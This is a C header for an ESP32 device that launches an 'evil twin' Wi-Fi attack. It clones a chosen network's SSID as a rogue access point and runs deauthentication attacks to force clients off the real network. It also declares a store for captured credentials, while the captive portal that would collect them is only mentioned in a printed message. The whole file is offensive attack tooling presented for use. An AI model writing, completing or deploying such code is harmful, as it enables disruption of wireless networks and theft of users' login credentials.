// eviltwin.h
#ifndef EVILTWIN_H
#define EVILTWIN_H

#include <WiFi.h>
#include <vector>

bool evilTwinActive = false;
std::vector<String> capturedCreds;

void startEvilTwin(int idx) {
  evilTwinActive = true;
  extern struct NetworkInfo networks[];
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(networks[idx].ssid.c_str());
  
  startDeauthAttack(idx);
  
  Serial.printf("Evil Twin started on %s\n", networks[idx].ssid.c_str());
  Serial.printf("AP IP: %s\n", WiFi.softAPIP().toString().c_str());
  Serial.println("Captive portal would be at http://" + WiFi.softAPIP().toString());
  Serial.println("(Full web server requires ESPAsyncWebServer library)");
}

void stopEvilTwin() {
  evilTwinActive = false;
  WiFi.softAPdisconnect(true);
  stopDeauthAttack();
  Serial.println("Evil Twin stopped");
}

void runEvilTwin() {
  if (!evilTwinActive) return;
  runDeauth();
  delay(10);
}

#endif
